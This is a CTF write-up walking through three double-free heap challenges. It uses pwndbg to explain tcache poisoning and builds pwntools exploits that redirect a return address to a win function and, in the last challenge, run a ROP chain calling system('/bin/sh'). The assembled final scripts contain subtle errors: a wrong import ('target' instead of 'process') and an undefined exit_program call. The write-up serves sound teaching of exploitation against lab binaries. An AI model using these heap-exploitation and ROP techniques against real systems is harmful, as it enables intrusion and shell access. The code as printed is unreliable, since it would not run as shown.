These challenges were all based around a double-free vulnerability, of increasing complexity. 

I will explain briefly some of the internals of `malloc` and `free` and how and why the intended solutions to these challenges work, but I will not go into great depth, and it is worth checking out some of the resources I've listed at the end of this writeup if you want to learn more about malloc internals and heap exploitation.

# What is a double free?

When memory is allocated with `malloc`, it can be subsequently released back to the allocator with `free.` Free will add the chunk to a linked list called a free list. However, if the same pointer is passed to free more than once, it will create a cycle in the free list. This will result in `malloc` returning a chunk which is simultaneously still linked into the free list.

# I Want To Break Free 0

This first challenge was intended to just introduce the concept of a double free vulnerability. The vulnerability is that `delete_note` does not check whether a note is already deleted before freeing it again. This means that you can cause a double free by creating a note and then deleting it twice. The note ID will not be listed in `menu_list_notes` once you've deleted it the first time, but deleting the same note ID again will still trigger a second free of the same pointer. 

In `view_secret`, you can see that the password is copied into a buffer which is allocated on the heap, and compared with a second buffer also subsequently allocated on the heap. This means that if you have previously triggered a double free, both of these buffers will be at the same location in memory (since `malloc` will return the double freed chunk twice due to the now cyclical freelist). This means that the comparison will always evaluate to true, since you will be writing the password into both `password_buf` and `entered_password_buf` at the same time, giving you the flag. 

![](/Assets/Pasted%20image%2020241005103244.png)

# I Want To Break Free 1

This challenge requires some basic understanding of heap metadata.

The first thing you should notice with this program is that it immediately displays the address of a stack variable (`choice`) upon starting. This is a hint that you may want to write something onto the stack.

The program also includes a `win` function, which will read the flag from the disk and print it. In many ways, this challenge is similar to standard ret2win buffer overflow challenges you may be used to, only without the buffer overflow.

Knowing that we have the location of a variable on the stack, and a target win function we would like to call, somehow overwriting the return pointer of the current stack frame to this win function seems like a good approach.

The vulnerability here is identical to before, with a missing check meaning that you can free the same note more than once. The difference is that here the goal is to leverage the double free bug to get an arbitrary write (allowing us to write data at to any location in the programs memory). We will do this by modifying heap metadata in such a way that `malloc` is coerced into returning a chunk outside of the heap, at a location of our choice.

First of all, it is worth identifying which "bin" (the specific type of free list), chunks are being allocated from. We can identify this by opening the program in gdb (I will be using [pwndbg](https://github.com/pwndbg/pwndbg), which has a lot of useful commands for analysing the heap).

Firstly, we will allocate a chunk, and then break and inspect the heap.

![](/Assets/Pasted%20image%2020241005112600.png)

This shows 4 allocated chunks. 3 of these are allocated by glibc internally, but we can identify which one is likely to be our chunk since we are always calling `malloc` with size `128` (from the `MAX_NOTE_LENGTH` definition), which will cause a chunks of size `144` bytes to be allocated since that is the smallest chunk size `malloc` can handle which would fit the requested size. The last allocated chunk shown above, allocated at `0x604a70` (this address will vary for you, since ASLR is enabled), is of size `0x90`, which is `144` in decimal. As such, this is likely our chunk.

Now we can continue the program, free the note, and inspect the heap again.

![](/Assets/Pasted%20image%2020241005113132.png)

This shows that the last chunk displayed was indeed ours, since it has now been freed and has been linked into a `0x90` size tcache bin (chunks are stored in specific free lists depending on their size, so `0x90` sized chunks will all be placed into this list when freed).

`tcache` bins are singly linked lists. This means that every free chunk has to have a pointer to the next free chunk in the list. As it turns out, this pointer is stored in the first 8 bytes of a chunk's "user data" (the region of memory which `malloc` returns a pointer to). 

When a chunk is allocated by `malloc` (in use), the layout of the chunk in memory is like so.
![](/Assets/Pasted%20image%2020241005105502.png)

However, when it gets freed (the assumption being that the program will no longer attempt to read/write into it), the user data is repurposed like so:

![](/Assets/Pasted%20image%2020241005105746.png)

As you can see, the pointer which was previously returned by `malloc` and pointed to the start of the chunk's user data now points to the forward pointer of the chunk within the linked list.

This means that if we were able to get `malloc` to return a chunk which is still within the free list, we could overwrite the forward pointer just by writing to the first 8 bytes of the returned chunk. This would then change the location of the next chunk in the free-list, allowing us to force `malloc` to return a pointer to an arbitrary memory location.

We continue the program in gdb, and then free the note again, and break and inspect the tcache.

![](/Assets/Pasted%20image%2020241005113530.png)

This shows that there is now a cycle in the tcache bin, meaning our double free was successful. If we continue and create a note, writing `AAAAAAAA` into it, we should see something interesting happen to the tcache.

![](/Assets/Pasted%20image%2020241005113721.png)

Since the chunk we just wrote into was still linked into the tcache bin, the forward pointer has now been set to `AAAAAAAA` or `0x4141414141414141`. If we allocate another chunk, it will return the original chunk again, and inspecting the tcache again should show that the next chunk to be allocated is stored at this custom address.

![](/Assets/Pasted%20image%2020241005113924.png)

Actually attempting to allocate another chunk will cause the program to segfault, since `0x4141414141414141` is not a valid memory address.

![](/Assets/Pasted%20image%2020241005114144.png)

This segfault is actually good, since it means that malloc is attempting to allocate our forged chunk.

It is at this point that it would be good to start writing an exploit script, since it will soon become necessary to deal with non-printable characters, and because it makes it easy to translate the exploit to the remote device. To do this, we will use the `pwntools` Python library.

Firstly, our exploit needs to load the target binary and run it.
The code below handles loading the binary into memory, and then starting it and attaching to its stdin/stdout.
```python
from pwn import process, ELF, p64, PTY

target = ELF("./chal")
io = process(target.path, stdin=PTY, stdout=PTY)
```

Then, we will define some wrapper functions for creating and deleting chunks.

```python
def create_note(data: bytes):
	io.recvuntil(b'> ')
	io.sendline(b'2')
	io.recvuntil(b': ')
	io.sendline(data)

def delete_note(index: int):
	io.recvuntil(b'> ')
	io.sendline(b'4')
	io.recvuntil(b': ')
	io.sendline(str(index).encode('utf-8'))

def exit_program():
	io.recvuntil(b'> ')
	io.sendline(b'5')
```

These simply wait for the menu prompt `> ` to be send, and then send the correct inputs for creating or deleting a note respectively, or exiting the program.

Recall that the first thing the binary does is print the location of a stack variable. It would be useful to read this when the process starts and store it for later. One way of doing this is like so:

```python
io.recvuntil(b'0x')
choice_addr_hex = io.recvline()[:-1].decode('utf-8')
choice_addr = int(choice_addr_hex, 16)
```

This simply discards the output of the process up until `0x`, which is printed at the start of the `choice` address. Then it reads up until the next newline character (which we discard with the `[:-1]`), converts it into a string, and stores it.
The final line then converts this from hex to an integer.

Now, we can begin writing our exploit.

First of all, we need to trigger our double free. Recall that this was done by creating a note, and then deleting it twice, like so:

```python
create_note(b'whatever')
delete_note(0)
delete_note(0)
```

Now, we allocate a note and write our custom chunk address into it's first 8 bytes. For now we will just use `0xdeadbeef`.

```python
forged_chunk = 0xdeadbeef
create_note(p64(forged_chunk))
```

Then we allocate one more copy of the previous note, which we discard, and then can write into our target chunk.

```python
create_note(b'')
written_data = b'whatever'
create_note(written_data)
```

Finally, we exit the program and enter interactive mode to see any further output.

```python
exit_program()
io.interactive()
```

Our exploit script should now look like this (I have moved `forged_chunk` and `written_data` to the top of the exploit for readability):

```python
from pwn import target, ELF, p64, PTY

target = ELF('./chal')
io = process(target.path, stdin=PTY, stdout=PTY)

def create_note(data: bytes):
	io.recvuntil(b'> ')
	io.sendline(b'2')
	io.recvuntil(b': ')
	io.sendline(data)

def delete_note(index: int):
	io.recvuntil(b'> ')
	io.sendline(b'4')
	io.recvuntil(b': ')
	io.sendline(str(index).encode('utf-8'))

io.recvuntil(b'0x')
choice_addr_hex = io.recvline()[:-1].decode('utf-8')
choice_addr = int(choice_addr_hex, 16)

forged_chunk = 0xdeadbeef
written_data = b'whatever'

create_note(b'whatever')
delete_note(0)
delete_note(0)
create_note(p64(forged_chunk))
create_note(b'')
create_note(written_data)
exit_program()

io.interactive()
```

So, we have achieved an arbitrary write (< 128 bytes) to any writable memory location. Now we need to leverage this to control the flow of execution.

As mentioned previously, we are given a stack leak and a win function, so overwriting the a return pointer with the win function seems like a good approach. 

First, we have to identify the offset between the choice variable we are given the location of, and a function's return address (we will target the return address of `menu_loop` here).

Lets run the program in gdb, run it, and break immediately.
![](/Assets/Pasted%20image%2020241005121502.png)

The program outputs the address of `choice` as `0x7fffffffdd8f`.
As shown by gdb, we are currently in the `__GI__libc_read` function, but we are trying to find the return pointer for the `menu_loop` stack frame. We can use the `info stack` command to list stack frames, and then `frame` to switch to inspecting the frame for `menu_loop`.

![](/Assets/Pasted%20image%2020241005121720.png)

`info frame` will then display where the return pointer (saved RIP) is located for the `menu_loop` stack frame.

![](/Assets/Pasted%20image%2020241005121826.png)

Here, it is at `0x7fffffffdda8`. 

We can subtract the address of choice (`0x7fffffffdd8f`) from `0x7fffffffdda8` to get the offset between choice and the return address (being `25` bytes). Even though ASLR is enabled, the offset between these locations will remain constant for each execution of the program, meaning we can predictably locate the target return address every time.

We can therefore calculate the address of `menu_loop`'s return address and store it in `forged_chunk` instead of `0xdeadbeef`.

```python
forged_chunk = choice_addr + 25
```

This means that malloc will now return the address of the return address of `menu_loop` in the final `create_note` call, so all that's left is to overwrite it to the address of the `win` function.

Since we have loaded the binary into memory, we can use `pwntools` to get the address of `win`, and store it in `written_data` instead of 'whatever'.

```python
written_data = p64(target.sym['win'])
```

Our final exploit now looks like this:

```python
from pwn import target, ELF, p64, PTY

target = ELF('./chal')
io = process(target.path, stdin=PTY, stdout=PTY)

def create_note(data: bytes):
	io.recvuntil(b'> ')
	io.sendline(b'2')
	io.recvuntil(b': ')
	io.sendline(data)

def delete_note(index: int):
	io.recvuntil(b'> ')
	io.sendline(b'4')
	io.recvuntil(b': ')
	io.sendline(str(index).encode('utf-8'))

io.recvuntil(b'0x')
choice_addr_hex = io.recvline()[:-1].decode('utf-8')
choice_addr = int(choice_addr_hex, 16)

forged_chunk = choice_addr + 25
written_data = p64(target.sym['win'])

create_note(b'whatever')
delete_note(0)
delete_note(0)
create_note(p64(forged_chunk))
create_note(b'')
create_note(written_data)
exit_program()

io.interactive()
```

After verifying that it works, you can change it to work remotely by simply replacing the line

```python
io = process(target.path, stdin=PTY, stdout=PTY)
```
with

```python
io = remote("127.0.0.1", 5000) # change the IP and port
```

# I Want to Break Free 2

This challenge is extremely similar to the previous. So much so that the exploit is exactly the same, right up until the last step. This time, there is no `win` function, so you will have to work out a different way of reading the flag.

An easy way to get the flag would be to just spawn a shell and then read it directly, so this is what we will do. You will notice that there is a second leak this time, of the address for `puts`. This is a hint that the intended solution to this challenge is to use a `ret2libc` attack.

If you are not at all familiar with the concept of `ret2libc`, the "goat ooo libc" challenge created by Seli is a nice introduction, since it has a less complex exploit leading up to the actual `ret2libc` payload. 

The core idea is that we will locate the `system` function in glibc when it is loaded into the program's memory, and then redirect the program's execution there, attempting to call `system("/bin/sh")`, which will spawn a shell.

Firstly, you will probably need to recalculate the offset between `choice` and the return address, since it will be slightly different. You can calculate this exactly the same way as before: run the program, break, switch to the `menu_loop` stack frame, view the return address, and subtract the leaked address of `choice` from it. This should give you an offset of `20`.

Also, since we will need to find the address of `system`, we will need to load libc into memory. These challenges all provide a copy of the version of libc (2.27) in use. This is automatically linked to the program when it runs by `ld-linux-x86-64.so.2` so you don't need to worry about that. We can load it into memory the same way as the target binary:

```python
target = ELF('./chal')
libc = ELF('libc.so.6')
```

Then, we modify the part of the exploit where we read the stack leak to also read the puts leak:

```python
io.recvuntil(b'0x')
choice_addr_hex = io.recvline()[:-1].decode('utf-8')
choice_addr = int(choice_addr_hex, 16)
io.recvuntil(b'0x')
puts_addr_hex = io.recvline()[:-1].decode('utf-8')
puts_addr = int(puts_addr_hex, 16)
```

We can use the puts leak to calculate the base address where libc has been placed in memory by ASLR. To do this, we simply subtract the location of puts in the libc we have stored in disk (which effectively has a base address of 0) from the location leaked from the binary. We can store this in a variable called `libc_base`.

```python
libc_base = puts_addr - libc.sym['puts']
```

Then, since we know the libc base, we can now compute the address of `system`. We do this by adding the location of `system` within the local libc to the libc base address.

```python
system = libc_base + libc.sym['system']
```

Now, there is one more thing we need to set up our exploit. `system` takes the address of a string representing the command to execute as an argument. We want to set this to the address of a string containing "/bin/sh", so that system spawns a shell.

The argument is passed through the `rdi` register, so we need to get the address into this register. An easy way to do this is with a `pop rdi` "ROP gadget". This simply means locating a `pop rdi` instruction followed by a `ret` somewhere within either the binary or the libc.

There are many ways of doing this, including pwntools' ROP module, `ROPgadget` and `ropper`. I will be using `radare2`'s built in ROP gadget finding. We can open the binary in `radare2` with `r2 ./chal`, and then use `/R pop rdi` to locate a `pop rdi; ret` gadget within the binary.

![](/Assets/Pasted%20image%2020241005134325.png)

We have found such a gadget located at `0x401893`. Now we need the location of `/bin/sh\x00` (the `\x00` is the string's null-terminator). Thankfully, the version of libc we are using has this string already in it. We can find it also using `radare2` (or `libc.search` in pwntools).

![](/Assets/Pasted%20image%2020241005134638.png)

It seems we have found one, located at the offset `0x17fc96` from the libc base.

Now, lets put the exploit together. We want to first return to `pop rdi; ret`, to place the address of `/bin/sh` in the `rdi` register, and then return to `system` to call `system("/bin/sh")` and spawn a shell. That means that the stack will need to look like

- pop rdi
- /bin/sh
- system

since this way the first `ret` from `main_loop` will pop the address of the `pop rdi` gadget from the top of the stack and jump to it, which will then pop the address of `/bin/sh` and place it in `rdi`, followed by the `ret` instruction popping the address of `system` and jumping to it.

Since we already have an arbitrary write starting at the return address of `menu_loop` from our previous exploit, we can simply change the `written_data` to contain this ROP chain.

```python
pop_rdi = 0x401893
bin_sh = libc_base + 0x17fc96

written_data = p64(pop_rdi) + p64(bin_sh) + p64(system)
```

This gives us a final exploit of

```python
from pwn import target, ELF, p64, PTY

target = ELF('./chal')
libc = ELF('libc.so.6')
io = process(target.path, stdin=PTY, stdout=PTY)

def create_note(data: bytes):
	io.recvuntil(b'> ')
	io.sendline(b'2')
	io.recvuntil(b': ')
	io.sendline(data)

def delete_note(index: int):
	io.recvuntil(b'> ')
	io.sendline(b'4')
	io.recvuntil(b': ')
	io.sendline(str(index).encode('utf-8'))

io.recvuntil(b'0x')
choice_addr_hex = io.recvline()[:-1].decode('utf-8')
choice_addr = int(choice_addr_hex, 16)
io.recvuntil(b'0x')
puts_addr_hex = io.recvline()[:-1].decode('utf-8')
puts_addr = int(puts_addr_hex, 16)

libc_base = puts_addr - libc.sym['puts']

system = libc_base + libc.sym['system']
pop_rdi = 0x401893
bin_sh = libc_base + 0x17fc96

forged_chunk = choice_addr + 20
written_data = p64(pop_rdi) + p64(bin_sh) + p64(system)

create_note(b'whatever')
delete_note(0)
delete_note(0)
create_note(p64(forged_chunk))
create_note(b'')
create_note(written_data)
exit_program()

io.interactive()
```

Lets try it:

![](/Assets/Pasted%20image%2020241005140058.png)

We got our shell and can read the flag. Now it should translate over to the remote just as easily as the previous one.
# Heap Resources

- Max Kamper - [Introduction to Glibc Heap Exploitation](https://www.youtube.com/watch?v=6-Et7M7qJJg&pp=ygUgaW50cm8gdG8gZ2xpYmMgaGVhcCBleHBsb2l0YXRvaW4%3D)
- [Nightmare](https://guyinatuxedo.github.io/25-heap/)
- [pwn.college](https://pwn.college/software-exploitation/dynamic-allocator-misuse/)
- [how2heap](https://github.com/shellphish/how2heap)

